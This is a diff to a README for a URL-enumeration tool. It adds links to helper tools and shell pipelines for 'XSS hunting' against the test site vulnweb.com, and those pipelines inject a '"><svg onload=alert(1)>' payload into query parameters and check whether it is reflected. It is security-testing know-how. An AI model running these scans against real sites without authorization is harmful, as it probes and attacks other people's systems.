@@ -29,11 +29,18 @@ bau vulnweb.com -s
 
 > [Nilo](https://github.com/ferreiraklet/nilo) - Checks if URL has status 200
 
+> [AiriXSS](https://github.com/ferreiraklet/airixss) - Checks for reflected parameters
+
+> [HTTPx](https://github.com/projectdiscovery/httpx) - URL probbing 
+
 ```bash
 # Pratical use with XARGS
 echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -ns' | nilo
 
-# XSS Hunting
-echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -s "php|js|svg|png"' | nilo | qsreplace '"><svg onload=alert(1)>'
+# XSS Hunting w/ NILO (Faster)
+echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -s "php|js|svg|png"' | nilo | qsreplace '"><svg onload=alert(1)>' | airixss -payload "alert(1)"
+
+# XSS Hunting w/ HTTPx (Probbing & slower)
+echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -s "php|js|svg|png"' | httpx -silent -mc 200 | qsreplace '"><svg onload=alert(1)>' | airixss -payload "alert(1)"
 ```
 
